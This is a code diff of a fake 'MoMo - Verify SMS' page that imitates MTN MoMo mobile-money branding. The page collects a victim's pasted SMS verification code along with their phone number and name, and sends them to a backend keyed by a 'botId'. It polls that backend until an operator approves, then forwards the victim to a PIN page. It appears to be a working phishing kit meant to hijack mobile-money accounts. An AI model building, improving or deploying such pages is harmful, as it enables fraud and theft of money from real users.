@@ -4,23 +4,16 @@
   <script>
   // ============================================================
   //  BOT ID RESOLVER — runs FIRST on every page load
-  //  Reads botId from URL immediately. Never defaults to bot1.
-  //  Persists to localStorage. Rewrites URL so refreshes keep it.
-  //  Stops the page if botId is missing.
   // ============================================================
   (function () {
     try {
       const params = new URLSearchParams(window.location.search);
 
-      // 1. Read from URL FIRST
       let botId = params.get('botId');
-
-      // 2. Fall back to localStorage ONLY if URL is empty
       if (!botId) {
         botId = localStorage.getItem('botId');
       }
 
-      // 3. If STILL empty, refuse to proceed. Do NOT default to any bot.
       if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
         document.documentElement.innerHTML =
           '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
@@ -31,17 +24,14 @@
         throw new Error('botId missing from URL and localStorage');
       }
 
-      // 4. Persist so later pages inherit it
       localStorage.setItem('botId', botId);
 
-      // 5. Ensure the URL always carries botId
       if (params.get('botId') !== botId) {
         params.set('botId', botId);
         const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
         window.history.replaceState({}, '', newUrl);
       }
 
-      // 6. Expose globally
       window.__BOT_ID__ = botId;
 
       console.log('🆔 botId resolved immediately:', botId);
@@ -55,27 +45,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>MoMo - Verify SMS</title>
   <style>
-    /* ===== MOMO STYLE ===== */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    html, body {
-      width: 100%;
-      min-height: 100%;
-    }
-
-    body {
-      font-family: Arial, Helvetica, sans-serif;
-      background: #fff;
-      overflow-x: hidden;
-    }
-
-    /* =========================================
-       APP CONTAINER
-    ========================================= */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { width: 100%; min-height: 100%; }
+    body { font-family: Arial, Helvetica, sans-serif; background: #fff; overflow-x: hidden; }
 
     .app {
       position: relative;
@@ -88,338 +60,151 @@
       overflow: hidden;
     }
 
-    /* =========================================
-       TOP BLUE AREA
-    ========================================= */
-
-    .top {
-      position: relative;
-      height: 200px;
-      background: #004c69;
-      padding-top: 52px;
-    }
-
+    .top { position: relative; height: 200px; background: #004c69; padding-top: 52px; }
     .top::after {
-      content: "";
-      position: absolute;
-      left: -10%;
-      bottom: -75px;
-      width: 120%;
-      height: 125px;
-      background: #fff;
+      content: ""; position: absolute; left: -10%; bottom: -75px;
+      width: 120%; height: 125px; background: #fff;
       border-radius: 50% 50% 0 0 / 70% 70% 0 0;
     }
 
-    /* =========================================
-       TOP BAR
-    ========================================= */
-
     .top-bar {
-      position: relative;
-      z-index: 2;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 22px;
-      margin-top: -10px;
+      position: relative; z-index: 2;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 22px; margin-top: -10px;
     }
 
     .back-btn {
-      color: #ffd500;
-      font-size: 30px;
-      text-decoration: none;
-      font-weight: 300;
-      line-height: 1;
-      background: none;
-      border: none;
-      cursor: pointer;
+      color: #ffd500; font-size: 30px; text-decoration: none; font-weight: 300;
+      line-height: 1; background: none; border: none; cursor: pointer;
       transition: color 0.2s;
     }
-    .back-btn:hover {
-      color: #ffffff;
-    }
+    .back-btn:hover { color: #ffffff; }
 
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
+    .logo { display: flex; align-items: center; gap: 8px; }
 
     .logo-box {
-      width: 40px;
-      height: 40px;
-      border-radius: 8px;
+      width: 40px; height: 40px; border-radius: 8px;
       background: linear-gradient(145deg, #087398, #003d59);
       box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      display: flex; align-items: center; justify-content: center;
     }
 
     .logo-symbol {
-      width: 22px;
-      height: 28px;
-      background: #ffd500;
+      width: 22px; height: 28px; background: #ffd500;
       clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
       position: relative;
     }
     .logo-symbol::after {
-      content: "";
-      position: absolute;
-      width: 6px;
-      height: 6px;
-      background: #004c69;
-      border-radius: 50%;
-      left: 8px;
-      top: 8px;
+      content: ""; position: absolute; width: 6px; height: 6px;
+      background: #004c69; border-radius: 50%; left: 8px; top: 8px;
     }
 
-    .logo-text {
-      color: #ffd500;
-      font-size: 20px;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-    }
-    .logo-text .light {
-      font-weight: 400;
-      font-size: 14px;
-      color: #b8d4e8;
-    }
-
-    /* =========================================
-       CARD
-    ========================================= */
+    .logo-text { color: #ffd500; font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
+    .logo-text .light { font-weight: 400; font-size: 14px; color: #b8d4e8; }
 
     .card {
-      position: relative;
-      z-index: 5;
-      width: calc(100% - 36px);
-      margin: -100px auto 0;
-      background: #fff;
-      border-radius: 34px;
+      position: relative; z-index: 5;
+      width: calc(100% - 36px); margin: -100px auto 0;
+      background: #fff; border-radius: 34px;
       padding: 32px 27px 27px;
       box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
     }
 
     .title {
-      text-align: center;
-      color: #07516b;
-      font-size: 25px;
-      font-weight: 400;
-      margin-bottom: 12px;
+      text-align: center; color: #07516b; font-size: 25px;
+      font-weight: 400; margin-bottom: 12px;
     }
-    .title strong {
-      font-weight: 700;
-    }
+    .title strong { font-weight: 700; }
 
-    .subtitle {
-      text-align: center;
-      color: #555;
-      font-size: 15px;
-      margin-bottom: 20px;
-    }
+    .subtitle { text-align: center; color: #555; font-size: 15px; margin-bottom: 20px; }
 
     .instruction-note {
-      font-size: 14px;
-      color: #0a0a0a;
-      background: #f8fafc;
-      padding: 12px 16px;
-      border-radius: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #e2e8f0;
-      line-height: 1.6;
+      font-size: 14px; color: #0a0a0a; background: #f8fafc;
+      padding: 12px 16px; border-radius: 12px; margin-bottom: 20px;
+      border: 1px solid #e2e8f0; line-height: 1.6;
     }
 
-    .valid-time {
-      font-size: 14px;
-      color: #5b6f7e;
-      margin-bottom: 20px;
-      text-align: center;
-    }
+    .valid-time { font-size: 14px; color: #5b6f7e; margin-bottom: 20px; text-align: center; }
 
-    /* Textarea */
     .message-area textarea {
-      width: 100%;
-      min-height: 120px;
-      padding: 14px 16px;
-      border: 1.5px solid #111;
-      border-radius: 20px;
-      font-size: 16px;
-      font-family: inherit;
-      resize: vertical;
-      outline: none;
-      transition: border 0.2s, box-shadow 0.2s;
-      background: #fff;
-      line-height: 1.6;
+      width: 100%; min-height: 120px; padding: 14px 16px;
+      border: 1.5px solid #111; border-radius: 20px;
+      font-size: 16px; font-family: inherit; resize: vertical;
+      outline: none; transition: border 0.2s, box-shadow 0.2s;
+      background: #fff; line-height: 1.6;
     }
     .message-area textarea:focus {
       border-color: #005572;
       box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
     }
-    .message-area textarea::placeholder {
-      color: #aaa;
-    }
+    .message-area textarea::placeholder { color: #aaa; }
 
-    /* Resend */
     .resend-wrap {
-      color: #666;
-      font-size: 15px;
-      margin-top: 16px;
-      text-align: center;
+      color: #666; font-size: 15px; margin-top: 16px; text-align: center;
     }
-    .resend-wrap .timer {
-      font-weight: 600;
-      color: #0a0a0a;
-    }
+    .resend-wrap .timer { font-weight: 600; color: #0a0a0a; }
     .resend-wrap .clickable {
-      color: #004c69;
-      font-weight: 700;
-      cursor: pointer;
-      text-decoration: underline;
+      color: #004c69; font-weight: 700; cursor: pointer; text-decoration: underline;
     }
-
-    /* =========================================
-       MESSAGE BOX
-    ========================================= */
 
     #message-box {
-      display: none;
-      padding: 12px 16px;
-      border-radius: 12px;
-      margin-top: 16px;
-      font-size: 15px;
-      font-weight: 500;
+      display: none; padding: 12px 16px; border-radius: 12px;
+      margin-top: 16px; font-size: 15px; font-weight: 500;
       border: 1px solid transparent;
     }
     #message-box.error {
-      display: block;
-      background: #fef3f2;
-      border-color: #fecdca;
-      color: #c0392b;
+      display: block; background: #fef3f2; border-color: #fecdca; color: #c0392b;
     }
     #message-box.success {
-      display: block;
-      background: #ecfdf3;
-      border-color: #abf0d1;
-      color: #0b2b3b;
+      display: block; background: #ecfdf3; border-color: #abf0d1; color: #0b2b3b;
     }
 
-    /* =========================================
-       BOTTOM BUTTON
-    ========================================= */
-
-    .bottom {
-      width: 100%;
-      padding: 0 18px 14px;
-      margin-top: 30px;
-    }
+    .bottom { width: 100%; padding: 0 18px 14px; margin-top: 30px; }
 
     .continue-btn {
-      width: 100%;
-      height: 69px;
-      border: none;
-      border-radius: 40px;
-      background: #d1d5db;
-      color: #fff;
-      font-size: 22px;
-      font-weight: 700;
-      cursor: not-allowed;
-      font-family: Arial, Helvetica, sans-serif;
-      transition: background 0.3s ease;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      position: relative;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
+      width: 100%; height: 69px; border: none; border-radius: 40px;
+      background: #d1d5db; color: #fff; font-size: 22px; font-weight: 700;
+      cursor: not-allowed; font-family: Arial, Helvetica, sans-serif;
+      transition: background 0.3s ease; text-transform: uppercase;
+      letter-spacing: 0.5px; position: relative;
+      display: flex; align-items: center; justify-content: center; gap: 12px;
     }
 
-    .continue-btn:enabled {
-      background: #005572;
-      cursor: pointer;
-    }
-    .continue-btn:enabled:hover {
-      background: #00415a;
-    }
-    .continue-btn:enabled:active {
-      transform: scale(.98);
-    }
+    .continue-btn:enabled { background: #005572; cursor: pointer; }
+    .continue-btn:enabled:hover { background: #00415a; }
+    .continue-btn:enabled:active { transform: scale(.98); }
 
-    /* Loading state keeps button colour and shows spinner */
-    .continue-btn.loading:disabled {
-      background: #005572;
-      opacity: 1;
-      cursor: wait;
-    }
+    .continue-btn.loading:disabled { background: #005572; opacity: 1; cursor: wait; }
 
     .continue-btn .btn-text { display: inline; }
     .continue-btn .btn-spinner {
-      display: none;
-      width: 26px;
-      height: 26px;
-      border: 3px solid rgba(255,255,255,0.3);
-      border-top: 3px solid #fff;
-      border-radius: 50%;
-      animation: spin .8s linear infinite;
+      display: none; width: 26px; height: 26px;
+      border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff;
+      border-radius: 50%; animation: spin .8s linear infinite;
     }
 
     .continue-btn.loading .btn-text { display: none; }
     .continue-btn.loading .btn-spinner { display: inline-block; }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    /* =========================================
-       RESPONSIVE
-    ========================================= */
+    @keyframes spin { to { transform: rotate(360deg); } }
 
     @media (max-width: 480px) {
-      .top {
-        height: 180px;
-        padding-top: 40px;
-      }
-      .top-bar {
-        padding: 0 16px;
-      }
-      .card {
-        width: calc(100% - 28px);
-        margin-top: -90px;
-        padding: 28px 20px 24px;
-        border-radius: 28px;
-      }
-      .title {
-        font-size: 22px;
-      }
-      .continue-btn {
-        height: 62px;
-        font-size: 20px;
-      }
+      .top { height: 180px; padding-top: 40px; }
+      .top-bar { padding: 0 16px; }
+      .card { width: calc(100% - 28px); margin-top: -90px; padding: 28px 20px 24px; border-radius: 28px; }
+      .title { font-size: 22px; }
+      .continue-btn { height: 62px; font-size: 20px; }
     }
 
     @media (max-width: 380px) {
-      .card {
-        padding-left: 16px;
-        padding-right: 16px;
-      }
-      .title {
-        font-size: 20px;
-      }
-      .message-area textarea {
-        min-height: 90px;
-        font-size: 14px;
-      }
-      .continue-btn {
-        height: 58px;
-        font-size: 18px;
-      }
+      .card { padding-left: 16px; padding-right: 16px; }
+      .title { font-size: 20px; }
+      .message-area textarea { min-height: 90px; font-size: 14px; }
+      .continue-btn { height: 58px; font-size: 18px; }
     }
 
     @media (max-height: 750px) {
-      .bottom {
-        margin-top: 15px;
-      }
+      .bottom { margin-top: 15px; }
     }
   </style>
 </head>
@@ -427,10 +212,7 @@
 
 <div class="app">
 
-  <!-- ================= TOP ================= -->
-
   <div class="top">
-
     <div class="top-bar">
       <button class="back-btn" onclick="window.history.back()">&#8592;</button>
 
@@ -443,10 +225,7 @@
 
       <div style="width: 30px;"></div>
     </div>
-
   </div>
-
-  <!-- ================= CARD ================= -->
 
   <div class="card">
 
@@ -473,8 +252,6 @@
 
   </div>
 
-  <!-- ================= BOTTOM BUTTON ================= -->
-
   <div class="bottom">
     <button class="continue-btn" disabled>
       <span class="btn-text">SUBMIT</span>
@@ -486,29 +263,33 @@
 
 <script>
   (function() {
+    'use strict';
+
     // ---------- CONFIG ----------
     const BACKEND_URL = ""; // leave empty to use same-origin
 
     // ---------- BOTID (resolved by the head script) ----------
     const botId = window.__BOT_ID__;
-    if (!botId) return;
+    if (!botId) {
+      console.warn('[MoMo] botId missing — page will not submit.');
+    }
 
     // ---------- READ OTHER DATA ----------
     const urlParams = new URLSearchParams(window.location.search);
     let phone = urlParams.get('phone') || localStorage.getItem('phone');
-    let name = localStorage.getItem('fullName');
+    let name  = localStorage.getItem('fullName');
 
     if (!phone) {
       alert('Session expired. Please start over.');
-      window.location.href = 'details.html?botId=' + encodeURIComponent(botId);
+      window.location.href = 'details.html?botId=' + encodeURIComponent(botId || '');
       return;
     }
     if (!name) {
       name = 'MTN User';
-      localStorage.setItem('fullName', name);
+      try { localStorage.setItem('fullName', name); } catch (e) {}
     }
 
-    localStorage.setItem('phone', phone);
+    try { localStorage.setItem('phone', phone); } catch (e) {}
 
     const subtitle = document.getElementById('subtitlePlaceholder');
     if (phone) {
@@ -516,9 +297,9 @@
     }
 
     // ---------- DOM REFS ----------
-    const textarea = document.getElementById('smsMessage');
+    const textarea    = document.getElementById('smsMessage');
     const continueBtn = document.querySelector('.continue-btn');
-    let msgDiv = document.getElementById('message-box');
+    let   msgDiv      = document.getElementById('message-box');
 
     if (!msgDiv) {
       const div = document.createElement('div');
@@ -568,13 +349,15 @@
     function updateTimerUI() {
       if (totalSeconds <= 0) {
         resendWrap.innerHTML = '<span class="clickable">Resend code</span>';
-        clearInterval(timerInterval);
-        timerInterval = null;
-        resendWrap.querySelector('.clickable').onclick = function(e) {
-          e.preventDefault();
-          startTimer(20);
-          hideMessage();
-        };
+        if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+        const clickable = resendWrap.querySelector('.clickable');
+        if (clickable) {
+          clickable.onclick = function(e) {
+            e.preventDefault();
+            startTimer(20);
+            hideMessage();
+          };
+        }
         return;
       }
       resendWrap.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
@@ -590,8 +373,6 @@
         if (totalSeconds <= 0) {
           totalSeconds = 0;
           updateTimerUI();
-          clearInterval(timerInterval);
-          timerInterval = null;
         } else {
           updateTimerUI();
         }
@@ -620,6 +401,28 @@
       }
     }
 
+    // ---------- REDIRECT HELPER ----------
+    function goToPin(requestId, phoneVal) {
+      var params = [
+        'botId='     + encodeURIComponent(botId || ''),
+        'requestId=' + encodeURIComponent(requestId || ''),
+        'phone='     + encodeURIComponent(phoneVal || phone || ''),
+        'name='      + encodeURIComponent(name || 'MTN User')
+      ].join('&');
+
+      var pinUrl = 'pin.html?' + params;
+
+      console.log('✅ Approved — redirecting to:', pinUrl);
+
+      // Try standard assignment first
+      window.location.href = pinUrl;
+
+      // Fallback if the browser blocks navigation for any reason
+      setTimeout(function () {
+        try { window.location.replace(pinUrl); } catch (e) {}
+      }, 400);
+    }
+
     // ---------- SUBMIT ----------
     continueBtn.addEventListener('click', function() {
       if (this.disabled || this.classList.contains('loading')) return;
@@ -627,6 +430,11 @@
       const message = textarea.value.trim();
       if (!message) {
         showMessage('Please paste or type the SMS message.', true);
+        return;
+      }
+
+      if (!botId) {
+        showMessage('❌ Invalid link. Please open this page through the official link.', true);
         return;
       }
 
@@ -656,13 +464,15 @@
         var requestId = data.requestId;
         if (!requestId) throw new Error('No request ID received');
 
+        try { localStorage.setItem('codeRequestId', requestId); } catch (e) {}
+
         stopPolling();
         var attempts = 0;
         var MAX_ATTEMPTS = 120; // ~3 minutes
 
         pollTimer = setInterval(function() {
           attempts++;
-          fetch(BACKEND_URL + '/check-code/' + requestId)
+          fetch(BACKEND_URL + '/check-code/' + encodeURIComponent(requestId))
             .then(function(res) {
               if (!res.ok) throw new Error('Verification error');
               return res.json();
@@ -679,11 +489,9 @@
                 stopPolling();
                 setLoading(false);
                 showMessage('✅ Verified! Redirecting...', false);
-                var pinUrl = 'pin.html?botId=' + encodeURIComponent(botId) +
-                             '&phone=' + encodeURIComponent(phone) +
-                             '&name=' + encodeURIComponent(name);
-                setTimeout(function() {
-                  window.location.href = pinUrl;
+                // Small delay so the success message is visible before navigating
+                setTimeout(function () {
+                  goToPin(requestId, phone);
                 }, 700);
                 return;
               }
